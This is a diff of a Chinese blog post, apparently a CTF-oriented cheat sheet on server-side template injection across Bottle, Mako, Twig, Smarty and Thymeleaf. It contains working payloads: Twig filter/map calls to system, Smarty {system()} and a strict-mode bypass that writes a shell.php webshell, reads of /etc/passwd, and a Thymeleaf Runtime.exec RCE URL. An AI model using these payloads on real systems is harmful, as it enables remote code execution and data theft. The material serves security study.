@@ -20,20 +20,24 @@
   <meta name="keywords" content="">
   <meta name="referrer" content="no-referrer">
   
-    <meta name="description" content="SSTI中经常涉及到jinja之外的模版，这里我们来总结一下各种模版都有什么特征以及如何利用 快速判断模版类型经典决策树通过决策树我们可以解决大部分情况下的模版判断  报错探测有时候题目会设置WAF，这就导致决策树可能走不通，这时候通过报错来探测模板类型就是一个好方法   | **触发字符** | **目标引擎**         | **语言环境** | **常见报错关键字**">
+    <meta name="description" content="SSTI中经常涉及到jinja之外的模版，这里我们来总结一下各种模版都有什么特征以及如何利用 快速判断模版类型经典决策树通过决策树我们可以解决大部分情况下的模版判断  报错探测有时候题目会设置WAF，这就导致决策树可能走不通，这时候通过报错来探测模板类型就是一个好方法  Python模板引擎Bottle语法Bottle使用SimpleTemplate引擎或简称为 stpl，支持%语法。 Simpl">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI进阶——多种模版引擎特征及应用">
 <meta property="og:url" content="https://www.sunynov.top/2026/06/30/%E5%A4%9A%E7%A7%8D%E6%A8%A1%E7%89%88%E5%BC%95%E6%93%8E%E7%89%B9%E5%BE%81%E5%8F%8A%E5%BA%94%E7%94%A8/index.html">
 <meta property="og:site_name" content="suny">
-<meta property="og:description" content="SSTI中经常涉及到jinja之外的模版，这里我们来总结一下各种模版都有什么特征以及如何利用 快速判断模版类型经典决策树通过决策树我们可以解决大部分情况下的模版判断  报错探测有时候题目会设置WAF，这就导致决策树可能走不通，这时候通过报错来探测模板类型就是一个好方法   | **触发字符** | **目标引擎**         | **语言环境** | **常见报错关键字**">
+<meta property="og:description" content="SSTI中经常涉及到jinja之外的模版，这里我们来总结一下各种模版都有什么特征以及如何利用 快速判断模版类型经典决策树通过决策树我们可以解决大部分情况下的模版判断  报错探测有时候题目会设置WAF，这就导致决策树可能走不通，这时候通过报错来探测模板类型就是一个好方法  Python模板引擎Bottle语法Bottle使用SimpleTemplate引擎或简称为 stpl，支持%语法。 Simpl">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5GqPZfBwGeEb4ynJ8KaaKv1tgAxpRBN0cfrKelHbSPpKTWj4dgjhBDb7I&s=10">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/114514.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260701205707462.png">
 <meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260701131333296.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260701205357940.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260701213655875.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260701234155860.png">
 <meta property="article:published_time" content="2026-06-30T15:26:48.000Z">
-<meta property="article:modified_time" content="2026-07-01T12:52:13.968Z">
+<meta property="article:modified_time" content="2026-07-01T15:45:10.762Z">
 <meta property="article:author" content="suny">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5GqPZfBwGeEb4ynJ8KaaKv1tgAxpRBN0cfrKelHbSPpKTWj4dgjhBDb7I&s=10">
+<meta name="twitter:image" content="https://gitee.com/bobrocket/img/raw/master/114514.png">
   
   
   
@@ -254,7 +258,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          138 字
+          3.6k 字
         
       </span>
     
@@ -265,7 +269,7 @@
         
         
         
-          2 分钟
+          30 分钟
         
       </span>
     
@@ -317,21 +321,9 @@
                 
                 <p>SSTI中经常涉及到jinja之外的模版，这里我们来总结一下各种模版都有什么特征以及如何利用</p>
 <h1 id="快速判断模版类型"><a href="#快速判断模版类型" class="headerlink" title="快速判断模版类型"></a>快速判断模版类型</h1><h2 id="经典决策树"><a href="#经典决策树" class="headerlink" title="经典决策树"></a>经典决策树</h2><p>通过决策树我们可以解决大部分情况下的模版判断</p>
-<p><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5GqPZfBwGeEb4ynJ8KaaKv1tgAxpRBN0cfrKelHbSPpKTWj4dgjhBDb7I&s=10" srcset="/img/loading.gif" lazyload alt="PortSwigger SSTI 经典探测决策树，AI 生成"></p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/114514.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="报错探测"><a href="#报错探测" class="headerlink" title="报错探测"></a>报错探测</h2><p>有时候题目会设置WAF，这就导致决策树可能走不通，这时候通过报错来探测模板类型就是一个好方法</p>
-
-
-| **触发字符** | **目标引擎**         | **语言环境** | **常见报错关键字**                       |
-| ------------ | -------------------- | ------------ | ---------------------------------------- |
-| % 或 <%      | Mako, Tornado        | Python       | MakoException, SyntaxException           |
-| @            | Razor                | C# / .NET    | TemplateParsingException, CSXXXX         |
-| #            | Velocity             | Java         | ParseErrorException, Lexical error       |
-| { 或 {{      | Jinja2, Twig, Django | Python, PHP  | TemplateSyntaxError, Twig Error          |
-| $ 或 ${      | FreeMarker, JSP EL   | Java         | ParseException, ELException              |
-| < 或 <%      | ERB                  | Ruby         | SyntaxError, ActionView::Template::Error |
-
-
-
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260701205707462.png" srcset="/img/loading.gif" lazyload alt="image-20260701205707462"></p>
 <h1 id="Python模板引擎"><a href="#Python模板引擎" class="headerlink" title="Python模板引擎"></a>Python模板引擎</h1><h2 id="Bottle"><a href="#Bottle" class="headerlink" title="Bottle"></a>Bottle</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>Bottle使用SimpleTemplate引擎或简称为 <em>stpl</em>，支持<code>%</code>语法。</p>
 <p>SimpleTemplate 支持 Python 表达式，也因此容易出现 SSTI。</p>
 <ul>
@@ -412,12 +404,12 @@
 <p>（本题wp摘自<a target="_blank" rel="noopener" href="https://blog.yanxisishi.top/2026/litctf_2026">LitCTF 2026 WEB方向全WP | 康可ing</a>）</p>
 <p>构造盲注也可以</p>
 <h1 id="PHP模版引擎"><a href="#PHP模版引擎" class="headerlink" title="PHP模版引擎"></a>PHP模版引擎</h1><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><h3 id="特性-2"><a href="#特性-2" class="headerlink" title="特性"></a>特性</h3><ul>
-<li><strong>使用统一的属性&#x2F;方法访问语法</strong>：使用点号 <code>.</code> 可以动态访问数组的键、对象的属性，或者调用对象的方法（例如 <code>user.name</code> 既可以代表数组的键值，也可以代表类属性或 <code>getName()</code> 方法），由引擎在底层自动进行判断和兼容。</li>
-<li><strong>支持求值与变量替换</strong>：使用双大括号 <code>&#123;&#123; var &#125;&#125;</code>。它会计算括号内表达式的值并将其嵌入到页面中，且默认会自动对输出内容进行 <strong>HTML 实体转义</strong>。</li>
-<li><strong>支持标签控制结构</strong>：使用 <code>&#123;% %&#125;</code> 标志。专门用于编写逻辑控制（如条件判断 <code>&#123;% if %&#125;`、循环遍历 `&#123;% for %&#125;`），由于不依赖缩进，它强制要求使用显式的 **闭合标签**（如 `&#123;% endif %&#125;</code>、<code>&#123;% endfor %&#125;</code>）来划定代码块边界。</li>
-<li><strong>采用严格的默认安全隔离环境</strong>：模板运行在专门的沙箱机制中，<strong>默认完全禁止</strong>直接调用原生的 PHP 危险函数（如 <code>system()</code>、<code>eval()</code>）。发生 SSTI 风险时，通常需要依赖特定版本下暴露的内置魔术对象（如 <code>_self.env</code>）或特定的高级过滤器（如 <code>filter</code>、<code>map</code>）作为跳板来间接执行代码。</li>
+<li><strong>使用统一的属性&#x2F;方法访问语法</strong>：使用点号 <code>.</code> 可以动态访问数组的键、对象的属性，或者调用对象的方法</li>
+<li><strong>支持求值与变量替换</strong>：使用双大括号 <code>&#123;&#123; var &#125;&#125;</code>。</li>
+<li><strong>支持标签控制结构</strong>：使用 <code>&#123;% %&#125;</code> 标志。专门用于编写逻辑控制（如条件判断 <code>&#123;% if %&#125;`、循环遍历 `&#123;% for %&#125;`），由于不依赖缩进，它强制要求使用显式的 闭合标签（如 `&#123;% endif %&#125;</code>、<code>&#123;% endfor %&#125;</code>）来划定代码块边界。</li>
+<li><strong>采用严格的默认安全隔离环境</strong>：模板运行在专门的沙箱机制中，默认完全禁止直接调用原生的 PHP 危险函数（如 <code>system()</code>、<code>eval()</code>）。发生 SSTI 风险时，通常需要依赖特定版本下暴露的内置魔术对象（如 <code>_self.env</code>）或特定的高级过滤器（如 <code>filter</code>、<code>map</code>）作为跳板来间接执行代码。</li>
 </ul>
-<h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><h4 id="使用过滤器实现RCE"><a href="#使用过滤器实现RCE" class="headerlink" title="使用过滤器实现RCE"></a>使用过滤器实现RCE</h4><p>新版 Twig（v3.x）删除了 <code>_self</code> 对象，但如果开发者在配置 Twig 时允许了一些特定对象传入，或者在某些特定场景下，<strong>利用 Twig 自身的循环&#x2F;数组过滤器</strong>依然可以实现 RCE。</p>
+<h3 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h3><h4 id="使用过滤器实现RCE"><a href="#使用过滤器实现RCE" class="headerlink" title="使用过滤器实现RCE"></a>使用过滤器实现RCE</h4><p>新版 Twig（v3.x）删除了 <code>_self</code> 对象，但如果开发者在配置 Twig 时允许了一些特定对象传入，或者在某些特定场景下，利用 Twig 自身的循环&#x2F;数组过滤器依然可以实现 RCE。</p>
 <p>Twig 的 <code>filter</code> 允许传入一个回调函数来过滤数组。如果我们将数组元素设为命令，回调函数设为 <code>system</code>，就能直接触发：</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">[&quot;whoami&quot;]</span> | filter(<span class="hljs-name">&quot;system&quot;</span>) &#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
@@ -429,10 +421,57 @@
 
 <h4 id="通杀Payload"><a href="#通杀Payload" class="headerlink" title="通杀Payload"></a>通杀Payload</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|map(<span class="hljs-name">&quot;system&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;, 0]</span>|sort(<span class="hljs-name">&quot;system&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[&quot;id&quot;]</span>|filter(<span class="hljs-name">&quot;system&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[0, 0]</span>|reduce(<span class="hljs-name">&quot;system&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>)|join(<span class="hljs-name">&quot;,&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;&#123;<span class="hljs-name">&quot;&lt;?php phpinfo();&quot;</span>:<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="hljs-name">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 
-<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><h1 id="Java模板引擎"><a href="#Java模板引擎" class="headerlink" title="Java模板引擎"></a>Java模板引擎</h1><h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17718">Bottle框架的ssti、内存马、污染深入浅出-先知社区</a></p>
-<p>[Python Bottle SSTI注入 | Jatopos的博客](<a target="_blank" rel="noopener" href="https://jatopos.github.io/2025/10/05/Python">https://jatopos.github.io/2025/10/05/Python</a> Bottle SSTI注入&#x2F;)</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260701205357940.png" srcset="/img/loading.gif" lazyload alt="image-20260701205357940"></p>
+<h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><h3 id="特性-3"><a href="#特性-3" class="headerlink" title="特性"></a>特性</h3><ul>
+<li><strong>使用独树一帜的单大括号语法</strong>：默认使用单大括号 <code>&#123; var &#125;</code> 作为其标识符，点号 <code>.</code> 用于访问数组键值或对象的属性&#x2F;方法</li>
+<li><strong>支持原生的 PHP 表达式与变量赋值</strong>：虽然它有自己的语法，但它允许在模板内直接声明和修改 PHP 变量（如 <code>&#123; assign var=&quot;name&quot; value=&quot;value&quot; &#125;</code>），甚至在未开启安全模式时，可以直接通过 <code>&#123; $cos = cos(0) &#125;</code> 这种形式调用 PHP 的原生内置函数。</li>
+<li><strong>支持特殊的原生代码块和闭合控制标签</strong>：使用 <code>&#123; if &#125;...&#123; /if &#125;</code>、<code>&#123; foreach &#125;...&#123; /foreach &#125;</code> 来编写逻辑控制。更特殊的是，它为了兼容原生 PHP，甚至自带了专用的代码块标签，允许直接在模板里嵌入原生的 PHP 代码（如老版本中的 <code>&#123; php &#125; ... &#123; /php &#125;</code> 标签）。</li>
+<li><strong>“开门大吉”的默认非沙箱环境（SSTI 的重灾区）</strong>：Smarty 在默认配置下<strong>几乎不提供任何沙箱隔离</strong>。这意味着一旦存在用户可控的 SSTI，攻击者不需要像 Twig 那样寻找复杂的子类链或特定的过滤器，直接利用其内置的特殊标签（如 <code>&#123; php &#125;</code>、<code>&#123; include_php &#125;</code>）或者直接调用 PHP 危险函数。</li>
+</ul>
+<h3 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h3><h4 id="直接RCE"><a href="#直接RCE" class="headerlink" title="直接RCE"></a>直接RCE</h4><p>由于Smarty3的默认非沙箱环境，RCE非常简单</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&#123;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl">&#123;<span class="hljs-function"><span class="hljs-title">passthru</span>(<span class="hljs-string">&#x27;id; uname -a&#x27;</span>)&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="PHP标签"><a href="#PHP标签" class="headerlink" title="PHP标签"></a>PHP标签</h4><p>在非常老的 Smarty v2 中，或者在 Smarty 3 中手动开启了允许原生 PHP 标签的环境下，可以直接这样写：</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;php&#125;</span><span class="language-xml">system(&#x27;whoami&#x27;);</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">php</span>&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="Smarty-v4-x-v5-x-严格模式绕过"><a href="#Smarty-v4-x-v5-x-严格模式绕过" class="headerlink" title="Smarty (v4.x &#x2F; v5.x) 严格模式绕过"></a>Smarty (v4.x &#x2F; v5.x) 严格模式绕过</h4><p>Smarty 4 或 Smarty 5 已经默认禁用了 <code>&#123;system()&#125;</code> 这种直接调用原生 PHP 函数的越权行为。但由于 Smarty 复杂的对象设计，依然可以通过其内置的静态类或内置方法实现完美绕过：</p>
+<p>写webshell</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#123;Smarty_Internal_Runtime_WriteFile::writeFile(&#x27;shell.php&#x27;, &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;, $smarty.template_object-&gt;smarty)&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>读敏感文件</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&#123;fetch file<span class="hljs-operator">=</span><span class="hljs-string">&quot;/etc/passwd&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust">&#123;$smarty.template_object<span class="hljs-punctuation">-&gt;</span><span class="hljs-title function_ invoke__">getStreamVariable</span>(<span class="hljs-symbol">&#x27;file</span>:<span class="hljs-comment">///etc/passwd&#x27;)&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260701213655875.png" srcset="/img/loading.gif" lazyload alt="image-20260701213655875"></p>
+<h1 id="Java模板引擎"><a href="#Java模板引擎" class="headerlink" title="Java模板引擎"></a>Java模板引擎</h1><h2 id="Thymeleaf"><a href="#Thymeleaf" class="headerlink" title="Thymeleaf"></a>Thymeleaf</h2><h3 id="特性-4"><a href="#特性-4" class="headerlink" title="特性"></a>特性</h3><ul>
+<li><strong>独创的“原型即模板”语法</strong>：它不破坏原生 HTML 的结构。它通过在 HTML 标签中添加特有的属性前缀（如 <code>th:text</code>、<code>th:value</code>）来嵌入动态逻辑。这意味着即使用浏览器直接双击打开 <code>.html</code> 源码，页面也能正常显示静态排版。</li>
+<li><strong>基于表达式语言（EL）进行变量替换</strong>：使用 <code>$&#123; var &#125;</code> 标识符。其底层高度依赖 <strong>OGNL</strong>（标准 Java 环境）或 <strong>SpEL</strong>（Spring 环境）表达式语言。大括号内不仅能写变量，还可以直接编写复杂的 Java 代码（如对象实例化、方法调用）。</li>
+<li>**支持多功能的片段表达式：使用 <code>~&#123; templateName :: fragmentName &#125;</code> 语法。它允许在一个 HTML 页面中动态引入另一个页面的某个片段（类似于组件化开发）。</li>
+<li><strong>表面严格、实则依赖上下文的沙箱环境</strong>：Thymeleaf 自身有一套静态黑名单（禁止直接调用 <code>java.lang.Runtime</code> 等危险对象）。但在 Spring 环境中，由于它允许通过 <code>@beanName</code> 直接调用 Spring 容器中的任意公开 Bean（如 <code>@environment</code> 或各种辅助工具类），这使得安全测试人员常常能通过 Spring 的上下文生态轻松绕过其原生沙箱。</li>
+</ul>
+<h3 id="用法-3"><a href="#用法-3" class="headerlink" title="用法"></a>用法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.roboterh.fastjsondemo.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestParam;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThymeleafController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">index</span><span class="hljs-params">(Model model)</span> &#123;<br>        model.addAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br>    <span class="hljs-meta">@GetMapping(&quot;/cmd&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String cmd)</span> &#123;<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">__$&#123;new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.BufferedReader</span>(new java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))<span class="hljs-selector-class">.readLine</span>()&#125;__::<span class="hljs-attribute">x</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="远程命令执行（RCE）"><a href="#远程命令执行（RCE）" class="headerlink" title="远程命令执行（RCE）"></a>远程命令执行（RCE）</h4><p>如果你想执行系统命令（比如弹出计算器或反弹 Shell），可以利用 Java 的 <code>Runtime</code> 类：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/localhost:8080/cmd</span>?cmd=__<span class="hljs-variable">$&#123;</span>T(java.lang.<span class="hljs-title class_">Runtime</span>).getRuntime().exec(<span class="hljs-string">&#x27;calc&#x27;</span>)&#125;<span class="hljs-symbol">__:</span><span class="hljs-symbol">:x</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260701234155860.png" srcset="/img/loading.gif" lazyload alt="image-20260701234155860"></p>
+<p>如果有文件上传漏洞的话，我们可以通过覆盖原路由读取的html文件来实现ssti</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;main&quot;</span>&gt;</span>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;&#x27;hello &#x27; + $&#123;message&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/17718">Bottle框架的ssti、内存马、污染深入浅出-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://jatopos.github.io/2025/10/05/Python%20Bottle%20SSTI%E6%B3%A8%E5%85%A5/">Python Bottle SSTI注入 | Jatopos的博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/i2u9/p/bottle-template.html">bottlepy template - Simple Love - 博客园</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11633">Mako模板引擎以及沙箱机制-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7113">TWIG 全版本通用 SSTI payloads-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/10556">Smarty 最新 SSTI 总结-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339962.html">完全搞懂Thymeleaf SSTI - FreeBuf网络安全行业门户</a></p>
 
                 
               </div>
